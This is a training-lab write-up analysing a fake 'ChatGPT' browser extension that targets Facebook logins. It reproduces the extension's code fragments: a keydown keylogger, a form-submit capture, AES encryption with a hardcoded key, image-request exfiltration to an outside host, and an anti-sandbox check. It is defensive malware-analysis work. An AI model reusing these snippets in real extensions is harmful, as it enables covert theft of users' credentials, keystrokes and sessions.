# Malicious ChatGPT Browser Extension Analysis: CyberDefenders

## Overview

This project documents my analysis of a malicious browser extension from a CyberDefenders malware analysis lab. The extension was disguised as a helpful browser extension named `ChatGPT`, but analysis revealed that it contained malicious functionality for credential theft, keystroke logging, encryption, anti analysis checks, cookie access, and data exfiltration.

The investigation focused on reviewing the extension files, identifying malicious JavaScript behavior, decoding obfuscated values, analyzing exfiltration methods, and documenting how the extension targeted users through browser activity.

## Video Walkthrough

[Watch my Malicious ChatGPT Browser Extension Analysis walkthrough on YouTube](https://www.youtube.com/watch?v=-Ku1cvWdPAU)

## Scenario Summary

Several employees reported unusual browser behavior after installing what they believed was a helpful browser extension named `ChatGPT`.

After installation, accounts began showing signs of compromise and sensitive information appeared to be leaking. The cybersecurity team was tasked with analyzing the extension to determine whether it contained malicious components.

The analysis focused on identifying:

* Obfuscation methods
* Targeted websites
* Credential theft behavior
* Keystroke capture
* Data encryption
* Exfiltration methods
* Anti analysis checks
* Session and cookie access

## Objective

The objective of this investigation was to:

* Reverse engineer the browser extension logic
* Identify how target URLs were hidden
* Determine which website the extension monitored
* Identify how stolen data was transmitted
* Review anti analysis behavior
* Identify the event used to capture submitted form data
* Identify the method used to capture keystrokes
* Determine the exfiltration domain
* Identify the credential theft function
* Determine the encryption algorithm used before exfiltration
* Review browser permissions related to cookies and session data

## Key Investigation Data

| Evidence Type | Finding |
|---|---|
| Lab platform | CyberDefenders |
| Lab focus | Malicious browser extension analysis |
| Extension name | `ChatGPT` |
| Encoding method | Base64 |
| Target website | `www.facebook.com` |
| HTML element used for exfiltration | `img` |
| Exfiltration domain | `Mo.Elshaheedy.com` |
| Form capture event | `submit` |
| Keystroke capture event | `keydown` |
| Credential theft function | `exfiltrateCredentials(username, password)` |
| Encryption algorithm | AES |
| Encryption key observed | `SuperSecretKey123` |
| Session related access | Cookies |
| Anti analysis condition | No browser plugins or HeadlessChrome user agent |

## Skills Demonstrated

* Browser extension analysis
* JavaScript code review
* Malware behavior analysis
* Obfuscation review
* Base64 decoding
* Credential theft analysis
* Keystroke logging analysis
* Cookie permission review
* Exfiltration method identification
* Encryption logic review
* Anti analysis behavior review
* Indicator extraction
* Incident documentation

## Tools and Evidence Used

* Browser extension source files
* JavaScript review
* `manifest.json`
* `app.js`
* `crypto.js`
* Base64 decoding
* Code editor review
* Browser permission analysis
* CyberDefenders lab evidence

## Investigation Methodology

### 1. Extension File Review

The investigation began by reviewing the browser extension files directly. The goal was to understand what permissions the extension requested and what JavaScript logic was responsible for suspicious behavior.

Important files included:

```text
manifest.json
app.js
crypto.js
```

The analysis focused on identifying functions related to data collection, encryption, browser events, and external communication.

### 2. Obfuscation and Encoding Review

The extension used Base64 encoding to hide target values and make analysis more difficult.

Example encoded target:

```javascript
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

Decoded value:

```text
www.facebook.com
```

This showed that the extension was monitoring Facebook related browser activity.

### 3. Target Website Identification

The decoded target domain showed that the extension monitored:

```text
www.facebook.com
```

This was important because it indicated the malware was designed to target user account activity on a specific high value website.

### 4. Form Submission Capture

The extension captured user submitted form data by listening for the `submit` event.

Observed event listener:

```javascript
document.addEventListener('submit', function(event)
```

This allowed the extension to capture usernames, emails, passwords, or other submitted form values before they could be sent to the legitimate website.

### 5. Keystroke Capture

The extension also monitored user keystrokes by listening for the `keydown` event.

Observed behavior:

```javascript
document.addEventListener('keydown', function(event) {
    var key = event.key;
    exfiltrateData('keystroke', key);
});
```

This showed that the extension was not limited to stealing form submissions. It also attempted to capture typed user input.

### 6. Credential Theft Function

The function used to exfiltrate credentials was clearly named:

```javascript
exfiltrateCredentials(username, password);
```

This function was responsible for handling stolen username and password values before they were encrypted and sent to the attacker controlled endpoint.

### 7. Encryption Review

Before sending stolen data, the extension encrypted the data using AES.

Observed encryption logic:

```javascript
encrypt: function(data) {
    const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
    return encrypted.toString(CryptoJS.enc.Base64);
}
```

Key findings from this function:

| Item | Value |
|---|---|
| Encryption algorithm | AES |
| JavaScript library | CryptoJS |
| Key | `SuperSecretKey123` |
| Output format | Base64 |
| IV behavior | Random 16 byte value |

This showed that the extension attempted to protect stolen data before exfiltration, likely to make network inspection and manual analysis more difficult.

### 8. Exfiltration Method

The extension used an image object to transmit stolen data.

Observed behavior:

```javascript
function sendToServer(encryptedData) {
    var img = new Image();
    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
    document.body.appendChild(img);
}
```

The exfiltration domain was:

```text
Mo.Elshaheedy.com
```

The use of an `img` element is notable because it can make data exfiltration appear like a normal image request in browser traffic.

### 9. Anti Analysis Behavior

The extension included logic to detect suspicious analysis environments.

Observed condition:

```javascript
if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
    alert("Virtual environment detected. Extension will disable itself.");
    chrome.runtime.onMessage.addListener(() => { return false; });
}
```

This showed that the extension checked for:

* No browser plugins
* HeadlessChrome in the user agent

These checks were likely used to identify virtual or automated analysis environments and disable the extension to avoid detection.

### 10. Cookie and Session Access

The extension requested permissions that allowed access to session related browser data.

Observed permissions:

```json
"permissions": [
  "tabs",
  "http://*/*",
  "https://*/*",
  "storage",
  "webRequest",
  "webRequestBlocking",
  "cookies"
]
```

The `cookies` permission was especially important because cookies can contain session related data and authentication material.

## MITRE ATT&CK Mapping

| Tactic | Technique Focus | Evidence |
|---|---|---|
| Initial Access | Malicious browser extension installation | Users installed a fake `ChatGPT` browser extension |
| Execution | Browser extension JavaScript execution | Malicious JavaScript ran inside the browser |
| Credential Access | Credential theft from form submissions | Extension captured submitted usernames and passwords |
| Credential Access | Keylogging | Extension captured keystrokes using `keydown` |
| Collection | Browser data collection | Extension accessed form input, keystrokes, and cookies |
| Defense Evasion | Anti analysis checks | Extension checked for no plugins and HeadlessChrome |
| Command and Control | Web based exfiltration | Data was sent to `Mo.Elshaheedy.com` |
| Exfiltration | Exfiltration through image request | Stolen encrypted data was placed in an image request URL |

## Attack Timeline

| Phase | Activity |
|---|---|
| Installation | User installed fake `ChatGPT` browser extension |
| Target selection | Extension decoded target website value from Base64 |
| Monitoring | Extension watched Facebook related activity |
| Credential capture | Form submissions were captured through the `submit` event |
| Keystroke capture | Typed input was captured through the `keydown` event |
| Encryption | Captured data was encrypted with AES |
| Exfiltration | Data was sent to `Mo.Elshaheedy.com` through an image request |
| Evasion | Extension attempted to disable itself in virtual or headless environments |
| Session access | Extension had cookie permissions through `manifest.json` |

## Key Findings

The investigation found that:

* The extension was disguised as a `ChatGPT` browser extension
* The extension targeted `www.facebook.com`
* Base64 was used to obscure target URLs
* The extension captured form submissions
* The extension captured keystrokes
* The extension used AES encryption before exfiltration
* The observed encryption key was `SuperSecretKey123`
* The extension sent stolen data through an `img` element
* The exfiltration domain was `Mo.Elshaheedy.com`
* The extension checked for virtual or headless browser environments
* The extension requested cookie permissions that could expose session related data

## Defensive Lessons Learned

This lab reinforced several important defensive lessons:

* Browser extensions can become powerful credential theft tools
* Extension permissions should be reviewed before installation
* Fake productivity tools can be used to gain user trust
* Base64 encoding can hide target domains from quick review
* Form submission and keystroke events can reveal credential theft behavior
* Image based exfiltration can blend into normal web traffic
* Cookie access can create serious session compromise risk
* Anti analysis checks can prevent simple sandbox detection
* Security teams should monitor for suspicious extension behavior and risky permissions

## Recommended Defensive Actions

Based on this investigation, recommended actions would include:

* Block the malicious extension ID if available
* Remove the extension from affected browsers
* Reset passwords for affected users
* Revoke active sessions for affected accounts
* Review browser extension inventory across endpoints
* Alert on risky extension permissions such as `cookies`, `webRequest`, and broad URL access
* Block communication to `Mo.Elshaheedy.com`
* Review proxy and DNS logs for connections to the exfiltration domain
* Monitor for suspicious image requests with encoded data parameters
* Educate users about fake browser extensions
* Restrict browser extension installation through policy
* Use allow lists for approved extensions

## What This Project Demonstrates

This project demonstrates my ability to:

* Analyze a malicious browser extension
* Review JavaScript for credential theft behavior
* Decode Base64 encoded values
* Identify target domains
* Identify keystroke logging behavior
* Analyze exfiltration methods
* Review encryption logic used by malware
* Identify anti analysis checks
* Review browser extension permissions
* Map observed behavior to MITRE ATT&CK
* Translate malware findings into defensive recommendations

## Disclosure Notice

This writeup is based on an authorized CyberDefenders training environment. It is intended to document the investigation process, lab indicators, and defensive concepts learned.

This page does not include private customer data, employer data, production system information, or unauthorized activity.
